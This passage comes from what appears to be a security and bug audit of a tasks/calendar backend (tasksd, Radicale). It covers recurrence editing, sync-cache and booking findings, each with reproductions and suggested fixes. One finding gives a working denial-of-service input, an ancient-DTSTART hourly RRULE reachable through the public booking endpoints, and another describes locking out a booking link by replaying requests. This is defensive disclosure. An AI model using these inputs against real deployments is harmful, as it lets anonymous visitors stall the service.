Reproduced with the repo's own `_thisandfuture_series()` fixture (tests/test_recur.py:871) — weekly 09:00Z x4 with an Apple-style override at 1/13 that moves 1/13, 1/20 and 1/27 to 10:00 and renames them 'TF':

BEFORE (recurrence_id, start, summary):
  ('2026-01-06T09:00:00+00:00', '2026-01-06T09:00:00+00:00', 'Std')
  ('2026-01-13T09:00:00+00:00', '2026-01-13T10:00:00+00:00', 'TF')
  ('2026-01-20T09:00:00+00:00', '2026-01-20T10:00:00+00:00', 'TF')
  ('2026-01-27T09:00:00+00:00', '2026-01-27T10:00:00+00:00', 'TF')

User clicks the 2026-01-13 chip -> Delete -> "This event" (`exclude_occurrence(series, '2026-01-13T09:00:00+00:00')`). AFTER:
  ('2026-01-06T09:00:00+00:00', '2026-01-06T09:00:00+00:00', 'Std')
  ('2026-01-20T09:00:00+00:00', '2026-01-20T09:00:00+00:00', 'Std')   <-- was 10:00 'TF'
  ('2026-01-27T09:00:00+00:00', '2026-01-27T09:00:00+00:00', 'Std')   <-- was 10:00 'TF'
The serialized resource contains only `EXDATE:20260113T090000Z` and no RECURRENCE-ID at all — the override component is gone from the bytes PUT to Radicale, so the loss is permanent.

Keeping the component is sufficient and correct: replaying the same input but only adding the EXDATE (no filter) yields exactly the desired
```

</details>

**Suggested fix.** Do not drop an override whose RECURRENCE-ID carries `RANGE=THISANDFUTURE`; the EXDATE
alone already removes that instance while leaving the later ones covered. i.e. add `and
str(c.get("RECURRENCE-ID").params.get("RANGE", "")).upper() != "THISANDFUTURE"` to the
drop predicate. Add a test that deletes the override's own slot and asserts the later
occurrences keep their overridden start and summary.

#### [x] split_series lacks the all-day <-> timed guard shift_series has, so toggling "all day" and saving "This and following" is an unhandled TypeError (500)

`backend/tasksd/ical/edit.py:983` (`split_series`) · **medium** · bug · `minor`

`shift_series` explicitly rejects a dateness switch (`raise ValueError("cannot switch a
series between all-day and timed with 'all events'")`, edit.py:742-746) and the route
turns that into a clean 422. `split_series` has no equivalent check: it coerces only
`base` to the anchor's dateness (lines 932-935) and never compares `edit.dtstart`
against the anchor, so `_wall_delta(edit.dtstart, base)` subtracts a `date` from a
`datetime` (or vice versa) and raises TypeError. `patch_event` only catches `ValueError`
(app.py:856-858), so the TypeError escapes as a 500. The SPA reaches this in one click:
the event modal renders the "all day" checkbox for every event including a recurring one
(CalendarView.tsx:556), and `commit()` for a non-'all' scope sends `start: startOut,
end: endOut` where `startOut` is `start.slice(0,10)` — a bare date string — with no
`all_day` flag (CalendarView.tsx:454, 486-487, 513-515).

<details><summary>Evidence</summary>

```
edit.py:926-936:
```
    delta = timedelta(0)
    if edit.dtstart is not UNSET and edit.dtstart is not None:
        base = anchor
        src_override = _find_override(Calendar.from_ical(raw), anchor)
        if src_override is not None and src_override.get("DTSTART") is not None:
            base = src_override.get("DTSTART").dt
        if isinstance(anchor, datetime) and not isinstance(base, datetime):
            base = datetime.combine(base, time())
        elif not isinstance(anchor, datetime) and isinstance(base, datetime):
            base = base.date()
        delta = _wall_delta(edit.dtstart, base)
```
`base` is coerced to the anchor's dateness; `edit.dtstart` never is.

Reproduced (values exactly as the SPA would send them):

1) Timed recurring series (`DTSTART:20260106T090000Z`, `RRULE:FREQ=WEEKLY;COUNT=4`), user ticks "all day" on the 2026-01-20 occurrence and saves with "This and following":
   `split_series(raw, '2026-01-20T09:00:00+00:00', EventEdit(dtstart=date(2026,1,21), dtend=date(2026,1,22)))`
   -> `TypeError: unsupported operand type(s) for -: 'datetime.date' and 'datetime.datetime'`

2) The reverse (all-day series `DTSTART;VALUE=DATE:20260106`, user unticks "all day"):
   `split_series(raw, '2026-01-20', EventEdit(dtstart=datetime(2026,1,21,9,0), dtend=datetime(2026,1,21,10,0)))`
   -> `TypeError: unsupported operand type(s) for -: 'datetime.datetime' and 'datetime.date'`

The same toggle with "All events" returns a friendly 422 (`shift_series` guard),
```

</details>

**Suggested fix.** Mirror shift_series' guard in split_series, right after `anchor =
_anchor_from_iso(...)`: when `edit.dtstart` is set and `isinstance(anchor, datetime) !=
isinstance(edit.dtstart, datetime)`, raise the same ValueError ("cannot switch a series
between all-day and timed…") so the route answers 422. Cover both directions with a
test.

#### [x] _event_duration subtracts DTEND-DTSTART with no tolerance for mixed value types or awareness, so one malformed foreign event becomes permanently uneditable (500)

`backend/tasksd/ical/edit.py:582` (`_event_duration`) · **low** · bug

Every other datetime helper in this file deliberately tolerates the shapes foreign
clients produce — `_wall_delta` handles mixed tz-awareness, `_comparable` drops to wall
clock rather than raising, `_period_start`/`_shift_value` handle PERIOD tuples.
`_event_duration` is the one left doing a raw `de.dt - ds.dt`. If DTSTART and DTEND
disagree on value type (DATE vs DATE-TIME) or on tz-awareness (`DTSTART;TZID=…` next to
a floating `DTEND`) — both writable through Radicale by any client sharing the
collection — this raises TypeError. `patch_event`/`delete_event` only map ValueError to
422, so it escapes as a 500, and because `_event_duration` sits on both per-occurrence
write paths the event can never be edited again. This is the identical failure mode the
already-fixed `RDATE;VALUE=PERIOD` finding describes, in the one helper that was not
hardened.

<details><summary>Evidence</summary>

```
edit.py:512-518:
```
def _event_duration(master: Event):
    ds, de, dur = master.get("DTSTART"), master.get("DTEND"), master.get("DURATION")
    if ds is not None and de is not None:
        return de.dt - ds.dt
```
Called unconditionally from `split_series` (edit.py:886) and from `_new_override` (edit.py:541) on the first "this event" edit.

Reproduced:
- Master `DTSTART:20260106T090000Z` + `DTEND;VALUE=DATE:20260107`, `RRULE:FREQ=WEEKLY;COUNT=4`:
  `split_series(raw, '2026-01-20T09:00:00+00:00', EventEdit())` -> `TypeError: unsupported operand type(s) for -: 'datetime.date' and 'datetime.datetime'`
  `apply_occurrence_override(raw, '2026-01-20T09:00:00+00:00', EventEdit(summary='q'))` -> same TypeError
- Master `DTSTART;TZID=America/Chicago:20260106T090000` + floating `DTEND:20260106T093000`:
  `split_series(raw, '2026-01-20T09:00:00-06:00', EventEdit())` -> `TypeError: can't subtract offset-naive and offset-aware datetimes`
  (`shift_series` on the same bytes succeeds, so the resource looks editable right up until the user picks "this event" or "this and following".)

App-level result: HTTP 500 with no handler, and every retry reproduces it — the resource is stuck.
```

</details>

**Suggested fix.** Compute the span through the tolerant helpers already in the file: `start, end =
_comparable(ds.dt, de.dt); return end - start`, so a DATE/DATE-TIME or aware/naive
mismatch degrades to a wall-clock span instead of raising. Add a fidelity/regression
case with a mixed-type DTSTART/DTEND master driven through split_series and
apply_occurrence_override.

#### [x] "This and following" on the FIRST occurrence writes a head whose UNTIL precedes its own DTSTART, leaving an undeletable empty resource behind forever

`backend/tasksd/ical/edit.py:1007` (`split_series`) · **low** · bug

`split_series` always bounds the head with `UNTIL = anchor - 1s` (or `-1 day` for all-
day) and always returns a head for the caller to PUT. When the anchor is the series'
first occurrence, that UNTIL is earlier than the head's own DTSTART, so the head's
recurrence set is empty. `engine.split_event` PUTs it regardless — including on the
delete path (`delete_tail=True`). The result is a VEVENT resource that stays on Radicale
(and as a cache row) forever while expanding to zero occurrences, so `events_in_range`
never emits it and the app can never render or delete it again. For "delete this and
following" from the first occurrence — the natural way to remove a whole series from an
occurrence chip — the server answers 204 and the SPA clears the rows, but nothing was
actually deleted.

<details><summary>Evidence</summary>

```
edit.py:871-875:
```
    rule = _rrule_dict(hmaster)
    if rule is not None:
        rule.pop("COUNT", None)
        rule["UNTIL"] = [_until_before(anchor)]
        _set_rrule(hmaster, rule)
```
Reproduced with the repo's `_series()` fixture (weekly 09:00Z, COUNT=5, first occurrence 2026-01-06):
`split_series(raw, '2026-01-06T09:00:00+00:00', EventEdit())` head:
```
DTSTART:20260106T090000Z
DTEND:20260106T093000Z
RRULE:FREQ=WEEKLY;UNTIL=20260106T085959Z
```
`recur.expand_occurrences(head, 2026-01-01, 2026-03-01)` -> `[]` (confirmed with both recurring_ical_events and the pinned vobject 0.9.9).

Service path: `delete_event(scope='thisandfuture', recurrence_id='2026-01-06T09:00:00+00:00')` -> `engine.split_event(..., delete_tail=True)` -> `self.dav.put(href, head, if_match=...)` — the resource is rewritten, never DELETEd. `service.events_in_range` appends nothing for it (has_rrule is true, expansion returns []), so it is invisible in the UI and there is no remaining way to remove it from the app. On the edit path the same husk is left behind next to the freshly-minted tail resource.
```

</details>

**Suggested fix.** Detect the empty head — the anchor is at or before the master's DTSTART and there is no
surviving RDATE before it — and have `engine.split_event` DELETE the resource instead of
PUTting the husk (for `delete_tail=True`, and replace-in-place for an edit). Either
surface it from `split_series` (e.g. return `None` for the head) or re-check it in the
engine. Add a test that "delete this and following" on the first occurrence removes the
resource.


### iCalendar read + recurrence

#### [x] _pathological_rule bounds instances-per-day but not the DTSTART→window gap, so an at-the-limit FREQ=HOURLY rule with an ancient DTSTART burns ~59 s CPU and ~1 GB RSS under the global service lock — reachable from the unauthenticated booking endpoints

`backend/tasksd/ical/recur.py:159` · **high** · security

`_pathological_rule` judges a rule only by its per-day density (`per_day >
_MAX_PER_DAY`, limit 24). `FREQ=HOURLY` is exactly 24/day, so it passes —
`test_ordinary_density_still_expands` even asserts it must. But the cost of
`query.between` is dominated by the *skip* phase from DTSTART to the window, which the
guard's own docstring identifies as the driver it fixed for sub-daily rules ('a dense
rule whose DTSTART precedes the window spends its time inside the library before it
yields anything'). That reasoning was never applied to the allowed 1..24/day band, so
`DTSTART:00010101T000000Z` + `RRULE:FREQ=HOURLY` (or the equivalent
`FREQ=DAILY;BYHOUR=0,…,23`) makes the library iterate ~17.7 M instances before yielding
anything. Cost is independent of the requested window, so even a one-day busy query pays
it in full. `service._link_busy` (service.py:640) holds `self._lock` across
`events_in_range` for every VEVENT collection, so a single poisoned resource in any
calendar stalls the whole process for a minute per request. Both public endpoints go
through it: `GET /api/public/booking/{token}` → `public_link_info` → `_link_busy`, and
the unauthenticated write `POST /api/public/booking/{token}/book` → `book_slot` →
`_link_busy` (service.py:738). Writing the resource needs CalDAV access to a shared
collection (adversary #2 in the trust model), but triggering it afterwards is anonymous
and repeatable.

<details><summary>Evidence</summary>

```
recur.py:159-162 is the whole shape test:
```
            per_day = _per_day(r)
            if per_day > _MAX_PER_DAY:
                return f"RRULE yields up to {per_day:g} instances/day (limit {_MAX_PER_DAY})"
    return None
```
Measured against the pinned deps (recurring_ical_events 3.8.2 / icalendar 7.2.2) with the repo's own `foreign_event_raw` helper:

  raw = foreign_event_raw("h1", dtstart="00010101T000000Z", dtend="00010101T003000Z", rrule="FREQ=HOURLY")
  recur.expand_occurrences(raw, date(2026,1,1), date(2026,2,12))
    -> 58.92 s, peak RSS 973 MB, n=750     # guard said: safe

Cost is window-independent (the skip phase dominates):
  FREQ=DAILY from 00010101, 42-day window  -> 1.91 s
  FREQ=DAILY from 00010101, ONE-day window -> 1.84 s   # book_slot's window

Failure scenario: a client sharing the collection (DAVx5/Thunderbird/anyone with the Radicale credentials) PUTs one VEVENT with DTSTART:00010101T000000Z and RRULE:FREQ=HOURLY. Every subsequent `GET /api/public/booking/<token>` and every `POST .../book` spends ~59 s and ~1 GB inside `_link_busy` while holding `self._lock`, so every other request in the process (list, task, calendar, settings) blocks behind it. The public POST limiter allows 15 requests/hour/client, which is 15 minutes of wall-clock stall per client per hour, and the 1 GB allocation is an OOM-kill risk in a memory-capped container. The owner's own calendar grid is equally affected.
```

</details>

**Suggested fix.** Bound the total iteration budget, not just the density. Give `_pathological_rule` the
window and each master's DTSTART and refuse when `per_day * days_between(dtstart,
window_end)` exceeds a budget (e.g. 100_000), the same up-front shape judgement already
applied to FREQ; or fast-forward the rule's DTSTART to the last slot before
`window_start` arithmetically before handing the calendar to `recurring_ical_events`.
Add a test asserting `FREQ=HOURLY` with a DTSTART decades before the window either
raises promptly or completes in well under a second.

#### [x] expand_occurrences silently truncates at max_occurrences=750, so a rule the guard explicitly permits loses ~12 days off the end of the calendar grid and makes the public booking page advertise slots that 409

`backend/tasksd/ical/recur.py:279` (`expand_occurrences`) · **medium** · bug

**Closed in the cluster-#42 pass**, alongside its twin ("A dense recurring
series stops blocking bookings past 750 occurrences") — the same truncation
seen from the booking side. The cap is now derived from the window
(`_MAX_PER_DAY × days + slack`, floored at the old 750) so every rule the
density guard permits expands in full, and overrunning it raises rather than
returning a short list.

`expand_occurrences` stops emitting after 750 occurrences with no signal to the caller —
no exception, no flag, nothing `events_in_range` can distinguish from 'the series really
ends here'. The cap is inconsistent with the density the guard permits: `_MAX_PER_DAY`
allows 24/day, and CalendarView requests a 43-day window (`fetchEvents`,
CalendarView.tsx:72-76 — `days[0]` to `days[41] + 1 day`), so a permitted `FREQ=HOURLY`
series yields 1032 occurrences and 282 of them (≈11.8 days of the grid) are dropped. The
grid renders those days empty with no indication anything was hidden, and
reload/navigation reproduces it deterministically. The same truncation feeds the
unauthenticated booking path: `public_link_info` → `_link_busy` runs over a window of
`horizon_days + 2` (up to 182 days), so a busy series above ~4.1 occurrences/day (e.g.
`FREQ=DAILY;BYHOUR=9,10,11,12,13`) loses its tail, `generate_slots` never sees that busy
time, and the public page offers slots inside real meetings. `book_slot` re-validates
against a 1-day window where the busy IS visible, so the visitor gets a 409 on a slot
the page just advertised. No test covers the cap at all:
`test_ordinary_density_still_expands` runs `FREQ=HOURLY` over a window that produces 615
occurrences, comfortably under 750, so raising or lowering the constant cannot fail the
suite.

<details><summary>Evidence</summary>

```
recur.py:233-237:
```
        seen.add(occ.recurrence_id)
        out.append(occ)
        if len(out) >= max_occurrences:
            break
    return out
```
Measured:
  raw = foreign_event_raw("h", dtstart="20260301T000000Z", dtend="20260301T003000Z", rrule="FREQ=HOURLY")
  recur.expand_occurrences(raw, date(2026,3,1), date(2026,4,12))   # the March 2026 grid
    -> emitted=750, first=2026-03-01T00:00:00+00:00, last=2026-04-01T05:00:00+00:00
    (1032 expected; 2026-04-01 06:00 through 2026-04-11 render as empty days)

  raw2 = foreign_event_raw("b", rrule="FREQ=DAILY;BYHOUR=9,10,11,12,13")   # 5/day, passes the guard
  recur.expand_occurrences(raw2, date(2026,1,1), date(2026,7,2))           # 182-day link horizon
    -> n=750, last=2026-06-04T13:00:00+00:00   # 2026-06-04..2026-07-02 look completely free

Existing coverage: tests/test_recur.py:242-249 `test_ordinary_density_still_expands` expands FREQ=HOURLY over date(2026,1,1)..date(2026,2,1) with DTSTART 2026-01-06 -> 615 occurrences, under the cap. `max_occurrences` appears in the suite only as an argument to calls that are expected to raise (lines 210, 221); nothing asserts what the cap does when it fires.
```

</details>

**Suggested fix.** Make the bound window-proportional rather than a flat constant (e.g. `_MAX_PER_DAY *
window_days + slack`), or — better — raise `ValueError` when the cap is hit instead of
returning a silently short list, so `events_in_range` takes its existing degrade-to-
master-row branch and the user sees one event rather than a hole. Add a test that
expands a permitted 24/day rule over the 43-day grid window and asserts either the full
count or the raise.

#### [x] _thisandfuture_shifts crashes with TypeError on a RANGE=THISANDFUTURE override whose RECURRENCE-ID and DTSTART differ in tz-awareness, wiping every occurrence of the series from the calendar

`backend/tasksd/ical/recur.py:109` (`_thisandfuture_shifts`) · **low** · bug · `minor`

`_thisandfuture_shifts` guards against one kind of mismatch between the override's
RECURRENCE-ID and its DTSTART — `isinstance(rid.dt, datetime) != isinstance(dtstart.dt,
datetime)` (dateness) — and then subtracts them. It does not guard against the *other*
mismatch: one being floating (naive) and the other zoned/UTC. Both are `datetime`, so
the dateness check passes, and `dtstart.dt - rid.dt` raises `TypeError: can't subtract
offset-naive and offset-aware datetimes`. This runs at recur.py:215, before any
expansion, so the exception escapes `expand_occurrences` (which documents itself as
raising `ValueError`) and `service.events_in_range` falls into its `except Exception`
branch — the whole series collapses to a single master row and every occurrence
disappears from the calendar. Mixed floating/zoned values in one component are exactly
the hostile-shaped ICS the trust model calls out; the app has no way to repair such a
resource, so the series stays un-viewable until another client rewrites it.

<details><summary>Evidence</summary>

```
recur.py:100-103:
```
        iso = _iso(rid)[0]
        if iso is None or isinstance(rid.dt, datetime) != isinstance(dtstart.dt, datetime):
            continue                      # mismatched dateness: no meaningful offset
        out[iso] = dtstart.dt - rid.dt
```
Reproduced:
  raw = foreign_event_raw("mix", "Std", rrule="FREQ=WEEKLY;COUNT=4",
      overrides=(("RECURRENCE-ID;RANGE=THISANDFUTURE:20260113T090000",   # floating
                  "DTSTART:20260113T100000Z",                            # UTC
                  "DTEND:20260113T103000Z", "SUMMARY:TF"),))
  recur.expand_occurrences(raw, date(2026,1,1), date(2026,2,10))
    File "tasksd/ical/recur.py", line 215, in expand_occurrences
      tf_shifts = _thisandfuture_shifts(cal)
    File "tasksd/ical/recur.py", line 103, in _thisandfuture_shifts
      out[iso] = dtstart.dt - rid.dt
  TypeError: can't subtract offset-naive and offset-aware datetimes

Without the override the same series expands to 4 occurrences; with it, `events_in_range` logs 'recurrence expansion failed' and renders a single master row on 2026-01-06 — the 01-13/01-20/01-27 instances vanish.
```

</details>

**Suggested fix.** Extend the same-shape check to tz-awareness: `if iso is None or isinstance(rid.dt,
datetime) != isinstance(dtstart.dt, datetime) or (isinstance(rid.dt, datetime) and
(rid.dt.tzinfo is None) != (dtstart.dt.tzinfo is None)): continue`. (The existing dedup
fallback at recur.py:225-232 then gives each covered instance its own start as an
anchor, which is the intended degradation.) Add a test asserting the series still
expands to distinct occurrences.


### Sync engine + cache

#### [x] Two cache rows can share one href: a resource whose UID changes in place becomes a permanent ghost, and acting on the ghost deletes the LIVE resource from Radicale

`backend/tasksd/sync/engine.py:145` · **high** · bug

`items` is keyed on `(collection_href, uid)` (schema.sql PK, store.py:186 `ON
CONFLICT(collection_href, uid)`), but the only deletion detector — the full_resync sweep
at engine.py:145-150 — is keyed on **href**. Nothing anywhere enforces one cache row per
href. So when a resource at href H stops carrying UID A and starts carrying UID B,
`_upsert_body` (engine.py:216) inserts a *second* row for (col, B) at the same href H,
and the old (col, A) row is unreachable by the sweep forever (H is still in `wire`).
`href_uid_map()` (store.py:254) is a dict keyed on href, so one of the two rows is not
even visible to the sweep loop. A full resync reports a perfectly clean pass —
`upserted=0, removed=0, skipped=0` — and the ghost survives every resync, every restart,
and a Radicale token reset. That directly breaks the stated invariant that SQLite is a
disposable projection: wiping the DB and resyncing produces a *different* state (one
row) than the live DB (two rows).  Worse than the phantom row: acting on the ghost
destroys the live resource, because both the delete and the edit path address the
resource by the ghost's cached href and then explicitly recover from the 412 by re-
reading the *current* revision without checking whose UID it now is. `delete_task`
(engine.py:451-457) answers a 412 with `self.dav.delete(href,
if_match=self.dav.head_etag(href))`, and `_edit` (engine.py:435-441) answers a 412 by
re-GETting and re-applying the edit to whatever body is there.  Trigger paths, both in
scope per the trust model ("OTHER CalDAV clients … write to the same collections with
equal rights", and Radicale's store is plain `.ics` files on the same host): (a) a
foreign client or script replacing a resource body in place with a different UID; (b)
the documented backup/restore procedure (docs/DEPLOY.md:159 — restore
`~/radicale/collections`), where a restored `<name>.ics` holds a different UID than the
file currently at that path. Note the codebase already treats hrefs as fully opaque and
explicitly decoupled from UIDs (test_sync.py: "href is opaque … never assert exact href
equality"), so there is no invariant on the wire that prevents this.

<details><summary>Evidence</summary>

```
engine.py:136-150 (full_resync sweep):
    for href, uid in store.href_uid_map(self.conn, collection_href).items():
        if href in wire or uid in skipped_uids:
            continue
        store.delete_item_by_href(self.conn, collection_href, href)

engine.py:451-457 (delete_task):
    try:
        self.dav.delete(href, if_match=row["etag"])
    except PreconditionFailed:
        try:
            self.dav.delete(href, if_match=self.dav.head_etag(href))   # no UID check

Reproduced against the real engine + real schema with a stub DavClient holding exactly ONE resource at /u/cal/x.ics:

  1. server: /u/cal/x.ics = UID uid-A "Task A", etag "e1"; engine.sync(COL)
     cache rows: [('uid-A', '/u/cal/x.ics', 'Task A')]
  2. a foreign writer replaces the body at the SAME href with UID uid-B "Task B", etag "e2"; engine.sync(COL)
     cache rows: [('uid-A', '/u/cal/x.ics', 'Task A'), ('uid-B', '/u/cal/x.ics', 'Task B')]
     store.search(conn, 'Task') -> [('uid-A','Task A'), ('uid-B','Task B')]   # ghost is searchable
  3. engine.full_resync(COL)
     stats: SyncStats(upserted=0, removed=0, skipped=0, full_resync=True)     # "clean" pass
     cache rows: unchanged — both rows still there. Permanent divergence.
  4. the user taps delete on the phantom "Task A" -> engine.delete_task(COL, 'uid-A')
     dav log: [('DELETE', '/u/cal/x.ics', '"e2"')]
     server afterwards: {}    # the LIVE "Task B" is gone from Radicale
     cache afterwards: [('uid-B', 'Task B')]   # delete_item_by_h
```

</details>

**Suggested fix.** Make the cache enforce one row per href. In `_upsert_body` (or inside
`store.upsert_item`), before writing, evict any other row at the same href: `DELETE FROM
items WHERE collection_href=? AND href=? AND uid<>?` (plus the matching `items_fts`
delete and `orphan_sidecar` for the evicted UID). Independently, make
`store.delete_item_by_href` take the expected UID and only delete that row, and make
`delete_task`'s 412 fallback verify the current body still carries the UID being deleted
(`ical.extract_from_raw(self.dav.get(href).data).uid == uid`) before force-deleting —
otherwise surface a ConflictError. Add a unit test with the stub DAV that rewrites a
href with a different UID and asserts `store.count_items(...) == 1` after the next sync.

#### [x] gc_orphans is global while the guard that gates it is per-collection, so one clean collection permanently deletes the sidecar state another collection's poison resource was protecting

`backend/tasksd/sync/engine.py:160` (`full_resync`) · **medium** · bug · `minor`

`full_resync` gates the only irreversible deletion in the cache layer behind `if not
stats.skipped:` — the comment says "Never run it off an incomplete enumeration." But
`stats.skipped` is scoped to the collection just enumerated, while
`store.gc_orphans(conn)` (store.py:307-314) has no `collection_href` predicate at all:
it deletes aged sidecar rows across the entire database. So the guard is defeated by any
*other* collection resyncing cleanly. A collection whose enumeration is permanently
incomplete (a resource a foreign client wrote that `extract_from_raw` cannot handle —
jtx Board / Tasks.org / a hand-edited .ics) never GCs its own orphans, exactly as
designed, and then loses them anyway the first time an unrelated calendar full-resyncs.
The lost state — kanban column, manual sort order, pins, estimated minutes — is
explicitly the one thing in the DB that no resync can rebuild.  Reachable without any
user action: a full resync fires on first sync, whenever Radicale prunes/invalidates a
sync token (test_sync.py::test_dropped_radicale_cache_recovers_consistently documents
this happening on Radicale 3.7.6), and whenever `mark_collection_deleted` nulls a token.
The existing regression test
(test_sync_unit.py::test_resync_does_not_gc_sidecars_off_an_incomplete_pass) uses a
single collection, so it cannot see this.

<details><summary>Evidence</summary>

```
engine.py:151-157:
    store.set_sync_token(self.conn, collection_href, result.token, full=True, error=stats.last_error)
    if not stats.skipped:
        store.gc_orphans(self.conn)          # <- no collection scope

store.py:307-314:
    def gc_orphans(conn, *, keep_days: int = 7) -> int:
        cur = conn.execute(
            "DELETE FROM sidecar WHERE orphaned_at IS NOT NULL "
            "AND orphaned_at < strftime('%Y-%m-%dT%H:%M:%fZ','now', ?)", ...)

Reproduced against the real engine + schema (two collections A=/u/a/, B=/u/b/):
  - A holds task a-1 with sidecar {kanban_column:'doing', sort_order:1.5, pinned:1}
  - a foreign client rewrites a-1's body into something extract_from_raw rejects (PRIORITY:HIGH)
  - engine.full_resync('/u/a/')  -> skipped=2, removed=1, a-1's sidecar orphaned_at set
  - backdate orphaned_at by 8 days
  - engine.full_resync('/u/a/')  -> "after A resync again, sidecar present: True"   # guard works
  - engine.full_resync('/u/b/')  -> "after B resync,  A's sidecar present: False"   # guard defeated

The user fixes a-1's body from another client a week later; the item comes back, but its kanban column, manual position and pin are gone for good.
```

</details>

**Suggested fix.** Scope the sweep to the collection whose enumeration was complete: give `gc_orphans` a
`collection_href` parameter (`... AND collection_href=?`) and pass `collection_href`
from `full_resync`. Keep the unscoped form only for an explicit maintenance call, if at
all. Extend test_resync_does_not_gc_sidecars_off_an_incomplete_pass to seed a second
collection and assert that resyncing it does not sweep the first collection's protected
orphan.

#### [x] Every upsert_item does a full scan of items_fts, making a full resync O(n²) — thousands of items freeze the whole API for tens of seconds under the global service lock

`backend/tasksd/db/store.py:272` (`_fts_replace`) · **medium** · bug

`_fts_replace` deletes the row's FTS entry with `DELETE FROM items_fts WHERE
collection_href=? AND uid=?`. Both columns are declared `UNINDEXED` in the fts5 table,
and fts5 has no index on them, so SQLite plans this as `SCAN items_fts VIRTUAL TABLE
INDEX 0:` — a full scan of the *entire* FTS table (all collections) for every single
item upserted. A full resync upserts every item in a collection, so its cost is (items
upserted) × (items in the whole DB).  That whole loop runs inside one `BEGIN IMMEDIATE`
(engine.py:132 `with _tx(self.conn)`), and `TaskService.sync_all` holds `self._lock` for
the entire per-collection sync (service.py:118-122). Since every API route reaches
SQLite through the same lock and the same single connection, the API is completely
frozen for the duration — no task list, no calendar fetch, no public booking page, no
login. Full resyncs are routine: first sync, Radicale pruning/invalidating a sync token,
and any collection that disappears and returns (`mark_collection_deleted` nulls the
token deliberately).  A few-thousand-event calendar is ordinary (one imported
holiday/sports subscription, or a few years of events), so this is reachable in normal
operation rather than at some theoretical scale.

<details><summary>Evidence</summary>

```
store.py:222-230:
    def _fts_replace(conn, collection_href, f):
        conn.execute("DELETE FROM items_fts WHERE collection_href=? AND uid=?", (collection_href, f.uid))
        conn.execute("INSERT INTO items_fts (uid, collection_href, summary, description, categories) VALUES (?,?,?,?,?)", ...)

schema.sql: CREATE VIRTUAL TABLE items_fts USING fts5(uid UNINDEXED, collection_href UNINDEXED, summary, description, categories, tokenize='unicode61');

Measured against the real schema:
  EXPLAIN QUERY PLAN DELETE FROM items_fts WHERE collection_href=? AND uid=?
    -> (3, 0, 0, 'SCAN items_fts VIRTUAL TABLE INDEX 0:')
  1000 scoped deletes over an 8000-row items_fts: 2.23 s  (2.23 ms each)

End-to-end via store.upsert_item (in-memory DB, so an on-disk DB is no faster), one full-resync-shaped pass re-upserting every item:
  N=1000 -> 0.56 s
  N=4000 -> 5.73 s
  N=8000 -> 21.20 s        # ~4x work for 2x items: quadratic

Failure scenario: an 8000-event calendar; Radicale prunes the sync token, so the next 30 s poll takes the full_resync branch. `sync_all` holds `TaskService._lock` and an exclusive SQLite write transaction for ~21 s. Every request during that window — including `GET /api/public/booking/{token}` and `POST /api/login` — blocks on `asyncio.to_thread(...) -> with self._lock`. No test covers cache behaviour above a handful of rows.
```

</details>

**Suggested fix.** Stop scanning to find the row. Either (a) make `items_fts` an external-content table
(`content='items', content_rowid=...`) and drive it by rowid, or (b) keep it
contentless-style but store the fts rowid: add an `INTEGER` column to `items` holding
the `items_fts` rowid written by the last insert (`conn.execute(...); rowid =
conn.lastrowid`) and delete with `DELETE FROM items_fts WHERE rowid=?`, which is O(1).
Either way, add a coverage test that a full resync of a few thousand items completes in
a bounded time.

#### [x] A list or calendar created or deleted by another CalDAV client is never pushed to the SPA — the sidebar keeps a list the server has already purged

`backend/tasksd/service.py:131` (`sync_all`) · **low** · rendering · `minor`

`sync_all` publishes an SSE event only when the *item-level* counters moved: `if
any(s.upserted or s.removed for s in stats)`. Collection-set changes are discovered
separately, by `self._engine.discover()` at service.py:114, whose result is thrown away
— `discover` upserts new collections and calls `store.mark_collection_deleted` for ones
that left, and neither shows up in `stats` (a collection marked deleted is excluded from
`get_collections`, so `sync()` is never even called for it and it contributes no
SyncStats at all).  So when the owner deletes a list on their phone (Tasks.org / DAVx5 /
Thunderbird), the background poll correctly purges the whole projection — items, FTS
rows, categories — and clears the collection from `/api/lists`, but no `rev` bump
reaches the browser. `api.subscribe` only fires `onChange` on a real event or on an SSE
reconnect (api.ts:357/366), and the stream is held open indefinitely by the 15 s
keepalive, so there is no other refresh trigger. The open tab keeps rendering the dead
list in the sidebar with its stale badge until some unrelated write happens; clicking it
404s (`resolve_list` returns None for a purged collection). The mirror case — a new
*empty* collection created elsewhere — is equally invisible until something is put in
it. Every other path that changes the collection set (`_create_collection`,
`update_collection`, `reorder_collections`, `delete_collection`) does publish, so this
is the one gap.

<details><summary>Evidence</summary>

```
service.py:113-133:
    with self._lock:
        self._engine.discover()                                   # <- adds/soft-deletes collections; return value dropped
        hrefs = [r["href"] for r in store.get_collections(self._conn)]
    ...
    if any(s.upserted or s.removed for s in stats):
        self._publish({"type": "sync"})

engine.discover() (engine.py:89-94) is the only place the background path notices a collection appearing or leaving:
    for row in store.get_collections(self.conn):
        if row["href"] not in live:
            store.mark_collection_deleted(self.conn, row["href"])

Failure scenario: web tab open on the Tasks view with lists Work / Groceries. The owner deletes Groceries in Tasks.org. Within 30 s the poll runs: `discover()` marks it deleted and `mark_collection_deleted` (store.py:96) purges its items/FTS/categories; no collection is synced for it, so `stats` is empty for that href and `upserted`/`removed` stay 0 across the sweep -> no publish -> no `rev` bump. The sidebar still shows "Groceries" with its old open-count badge; `GET /api/lists/groceries/tasks` now 404s. The stale row persists indefinitely because nothing else in the app polls.
```

</details>

**Suggested fix.** Have `discover()` report whether the live collection set changed (it already computes
`live` and iterates the stale rows) and publish on that: e.g. return the set of
added/removed hrefs and in `sync_all` do `if changed or any(s.upserted or s.removed for
s in stats): self._publish({"type": "sync"})`. Add a test that a collection vanishing
from `list_collections()` between two `sync_all()` calls emits an event.


### Scheduling + public booking

#### [x] Idempotent replay of a booking POST spends the per-link ceiling, so anyone holding the published URL can lock the link out permanently

`backend/tasksd/app.py:1309` (`public_booking_book`) · **medium** · security

The per-link ceiling was deliberately changed (see docs/AUDIT.md "Public booking link
can be permanently disabled…") to count "BOOKINGS, not requests" — the comment at
app.py:1060-1066 says the budget is spent "only on a booking that actually landed". But
`book_slot` returns a non-None confirmation on the *replay* path too
(service.py:725-729: same `client_id` → `store.get_booking_by_event` hit → `return
self._confirmation(link, prior)`), and the route charges the link key for any non-None
result. A replay lands nothing on the calendar yet spends a credit, so the exact denial-
of-service the fix was written to remove is still reachable — with a single real booking
plus a replay loop.

<details><summary>Evidence</summary>

```
app.py:1102-1121:
```python
            result = await _run(
                _svc(request).book_slot, token,
                start_iso=body.start, name=body.name.strip(), ...)
        ...
        if result is None:
            raise HTTPException(status.HTTP_404_NOT_FOUND, "unknown booking link")
